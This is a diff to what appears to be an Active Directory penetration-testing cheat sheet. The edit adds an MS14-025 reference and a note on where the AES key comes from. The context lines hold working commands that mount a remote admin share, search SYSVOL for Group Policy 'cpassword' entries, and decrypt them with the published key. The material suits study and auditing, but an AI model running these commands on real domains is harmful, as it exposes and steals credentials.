@@ -129,13 +129,13 @@ smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw
 
 :triangular_flag_on_post: GPO Priorization : Organization Unit > Domain > Site > Local
 
-Find password in SYSVOL
+Find password in SYSVOL (MS14-025)
 
 ```powershell
 findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
 ```
 
-Decrypt a Group Policy Password found in SYSVOL (by [0x00C651E0](https://twitter.com/0x00C651E0/status/956362334682849280))
+Decrypt a Group Policy Password found in SYSVOL (by [0x00C651E0](https://twitter.com/0x00C651E0/status/956362334682849280)), using the 32-byte AES key provided by Microsoft in the [MSDN - 2.2.1.1.4 Password Encryption](https://msdn.microsoft.com/en-us/library/cc422924.aspx)
 
 ```bash
 echo 'password_in_base64' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000
